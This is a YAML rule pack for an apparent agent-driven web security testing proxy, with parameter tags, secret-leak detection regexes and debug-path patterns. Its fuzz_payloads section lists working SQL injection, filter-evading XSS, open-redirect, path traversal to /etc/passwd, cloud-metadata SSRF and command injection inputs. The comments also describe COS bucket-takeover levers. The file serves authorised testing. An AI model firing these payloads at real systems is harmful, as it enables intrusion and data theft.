# AgentProxy default rule pack.
# This file ships inside the package and is loaded on every session start.
#
# To customise:
#   1. Copy this file to e.g. ~/work/my_rules.yaml
#   2. Edit only the sections you care about (deep merge — unspecified keys
#      keep the defaults from this file)
#   3. Start the server with `agent-proxy --config ~/work/my_rules.yaml`
#      OR set env var `AGENT_PROXY_CONFIG=~/work/my_rules.yaml`
#
# All values here can be inspected at runtime via the `config_show` MCP tool.

# 11 categories of semantic parameter tags. Every traffic_params() call
# annotates path/query/json/form/header/cookie names with the tags below.
# Word matching is lowercase + split on -/_/. before exact compare; prefix/
# suffix matches also count. Add new entries freely — agent immediately picks
# them up after restart.
semantic_params:
  identity_param:
    - userid
    - uid
    - user_id
    - accountid
    - account_id
    - tenantid
    - tenant_id
    - orgid
    - org_id
    - organizationid
    - companyid
    - company_id
    - memberid
    - member_id
    - owner
    - ownerid
    - creator
    - creatorid
    - larkaccountid
    - serviceid
    - appid
    - app_id

  object_id_param:
    - historyid
    - history_id
    - taskid
    - task_id
    - fileid
    - file_id
    - objectid
    - object_id
    - groupid
    - group_id
    - roomid
    - room_id
    - knowledgebaseid
    - datasetid
    - dashboardid
    - configid
    - config_id
    - anchor_id
    - ticket

  privilege_param:
    - role
    - roles
    - permission
    - permissions
    - scope
    - isadmin
    - is_admin
    - admin
    - privilege
    - privileges
    - level
    - access_level

  money_param:
    - price
    - amount
    - balance
    - fee
    - cost
    - total
    - discount
    - credits
    - points

  ssrf_candidate:
    - url
    - uri
    - src
    - source
    - callback
    - callbackurl
    - callback_url
    - webhook
    - webhook_url
    - notify_url
    - endpoint
    - host
    - proxy
    - fetch
    - import
    - datasource
    - data_source
    - restapi
    - rest_api
    - image_url
    - avatar_url
    # lowercase compounds that camelCase tokenizing wouldn't split (FileURL is
    # already covered via the `url` token, but an all-lowercase `fileurl` param
    # is not) — seen verbatim in Tencent DMS/DMC import-SSRF reports.
    - fileurl
    - sourceurl
    - source_url
    - targeturl
    - target_url
    - remoteurl
    - remote_url

  object_storage:
    - bucket
    - object
    - objectkey
    - object_key
    - tos
    - s3
    - oss
    - cos
    # COS STS-credential carriers — when these appear in a RESPONSE the agent is
    # one signed request away from bucket takeover / arbitrary overwrite.
    - cos_credential
    - credentials
    - sts
    - tmpsecretid
    - tmpsecretkey
    - sessiontoken

  redirect_candidate:
    - redirect
    - redirect_uri
    - redirect_url
    - redirecturi
    - redirecturl
    - next
    - return
    - returnurl
    - return_url
    - goto
    - dest
    - destination
    # reflected-XSS / open-redirect sinks named `link` / `jumpurl` — the exact
    # param Tencent 问卷/文档 1click reports injected `javascript:` into.
    - link
    - jumpurl
    - jump_url

  file_param:
    - file
    - filename
    - filepath
    - path
    - include
    - load
    - preview
    - download
    - image
    - avatar

  sql_candidate:
    - sql
    - query
    - where
    - filter
    - orderby
    - order_by
    - order
    - sort
    - sortby
    - sort_by
    - group
    - groupby
    - having
    - metrics
    - fields
    - columns

  expression_candidate:
    - expr
    - expression
    - script
    - template
    - tpl
    - el
    - formula
    - rule

  command_candidate:
    - cmd
    - command
    - exec
    - shell
    - process

  state_token:
    - csrf
    - xsrf
    - _token
    - token
    - code
    - state
    - nonce


# Headers that traffic_params() will surface to the agent. Cookie / Auth
# values are normalised so the actual secret never enters the agent context.
interesting_headers:
  - authorization
  - cookie
  - x-csrf-token
  - x-xsrf-token
  - x-api-key
  - x-auth-token
  - x-access-token
  - origin
  - referer
  - x-forwarded-for
  - x-real-ip
  - x-forwarded-host
  - x-original-url
  # COS object-ACL / response-rewrite headers — the levers in the QQ小店 /
  # 群管理 stored-XSS and bucket-overwrite reports (set public-read, grant
  # full-control to attacker uin, or rewrite content-type to text/html).
  - x-cos-acl
  - x-cos-grant-full-control
  - x-cos-grant-read
  - response-content-type


# Passive-scan rules.
# `kind: finding` = high confidence — surfaced by traffic_findings() default
# `kind: signal`  = low confidence — only when the agent asks kind="signal"|"all"
passive_scan:
  # URL path substrings that trigger the `debug_endpoint` finding.
  # Each entry becomes one alternative inside a single regex; escape regex
  # meta characters yourself when needed.
  debug_paths:
    - /actuator(?:/|$)
    - /debug(?:/|$)
    - /swagger(?:-ui)?
    - /api-docs
    - /\.git/
    - /\.env(?:$|\.)
    - /phpinfo\.php
    - /server-status
    - /server-info
    - /druid/
    - /console/
    - /wp-admin/
    - /trace\.axd

  # Parameter names that trigger the `sensitive_param` SIGNAL.
  sensitive_param_names:
    - redirect
    - redirect_uri
    - redirect_url
    - url
    - next
    - callback
    - return
    - returnurl
    - return_url
    - goto
    - dest
    - destination
    - file
    - filename
    - path
    - filepath
    - include
    - page
    - cmd
    - exec
    - command
    - template
    - tpl
    - sourceurl
    - fileurl
    - response-content-type

  # Response-body regex rules.
  # severity: info | low | medium | high
  # category: free-form (used by traffic_findings(category=...) filter)
  # kind: finding | signal
  body_rules:
    - id: aws_access_key
      severity: high
      category: secret_leak
      kind: finding
      regex: 'AKIA[0-9A-Z]{16}'

    # Tencent Cloud permanent access key. Distinct prefix from AWS (AKID vs
    # AKIA). Heart of the COS bucket-takeover reports: leaks in upload-flow
    # responses / signed URLs.
    - id: tencent_access_key
      severity: high
      category: secret_leak
      kind: finding
      regex: 'AKID[0-9A-Za-z]{13,40}'

    # Tencent STS *temporary* credential triple. The upload endpoint hands these
    # back in its response; the attacker re-signs COS requests with them. Match
    # the field names (in JSON or query) — the values vary in shape.
    - id: tencent_sts_credential
      severity: high
      category: secret_leak
      kind: finding
      flags: i
      regex: '"?(?:tmpsecretid|tmpsecretkey|sessiontoken|cos_credential|credentials)"?\s*[:=]'

    # A COS pre-signed URL. Its mere presence in a response means a signed
    # capability is reachable; if it signs `/` (root) the bucket is listable.
    - id: cos_presigned_url
      severity: medium
      category: secret_leak
      kind: finding
      flags: i
      regex: 'q-sign-algorithm=sha1&[^"''\s]*q-signature=[0-9a-f]{40}'

    # Other major-cloud AKs seen in CN bug-bounty scope (Aliyun / Volc-BytePlus).
    - id: aliyun_access_key
      severity: high
      category: secret_leak
      kind: finding
      regex: 'LTAI[0-9A-Za-z]{12,30}'

    - id: volc_access_key
      severity: high
      category: secret_leak
      kind: finding
      regex: 'AKLT[0-9A-Za-z]{16,}'

    - id: private_key_block
      severity: high
      category: secret_leak
      kind: finding
      regex: '-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----'

    - id: jwt_in_body
      severity: medium
      category: secret_leak
      kind: finding
      regex: 'eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}'

    - id: sqli_db_error
      severity: high
      category: sqli_signal
      kind: finding
      flags: i
      regex: 'SQLSTATE\[|ORA-\d{4,5}|MySQL server version|You have an error in your SQL syntax|PostgreSQL.*?ERROR|SQLiteException|System\.Data\.SQLClient\.SqlException'

    - id: stacktrace
      severity: medium
      category: error_signal
      kind: finding
      flags: m
      regex: 'Traceback \(most recent call last\)|^\s+at [\w\.$]+\([\w\.]+:\d+\)|Whitelabel Error Page'


# Fuzz payloads consumed by traffic_fuzz(payload_category=...).
# Add new categories freely (e.g. ssti, xxe, nosql, log4shell). Each
# category just needs a list of strings; AgentProxy substitutes them into
# the target parameter and watches for status / length / reflection anomalies.
fuzz_payloads:
  sqli:
    - "'"
    - '"'
    - "' OR '1'='1"
    - "'; DROP TABLE users--"
    - "1' ORDER BY 1--+"

  xss:
    - '<script>alert(1)</script>'
    - '"><script>alert(1)</script>'
    - '<img src=x onerror=alert(1)>'
    # Pseudo-protocol + CRLF + multi-encoding variants for js-redirect / iframe
    # src / href sinks (Tencent 问卷·文档·手游助手 reflected-XSS reports). The
    # %0a / %250a / %25250a ladder defeats one and two layers of URL-decoding;
    # atob() hides the alert payload from naive keyword filters.
    - 'javascript:alert(1)'
    - 'javascript://%0aalert(1)'
    - 'javascript://%250aalert(1)'
    - 'javascript://%25250aeval(atob(''YWxlcnQoMSk=''))'
    - 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='

  # Open-redirect / OAuth-redirect_uri abuse — pair with redirect_candidate
  # tags. Confirmation is a 30x Location: to the foreign origin.
  open_redirect:
    - 'https://evil.example'
    - '//evil.example'
    - '/\evil.example'
    - 'https://evil.example%2f%2e%2e'
    - 'javascript:alert(document.domain)'

  path_traversal:
    - '../../../etc/passwd'
    - '..%2F..%2F..%2Fetc%2Fpasswd'
    - '/windows/win.ini'

  ssrf:
    - 'http://127.0.0.1'
    - 'http://localhost'
    - 'http://169.254.169.254/latest/meta-data/'

  command_injection:
    - '; ls'
    - '| whoami'
    - '$(cat /etc/passwd)'
    - '`id`'
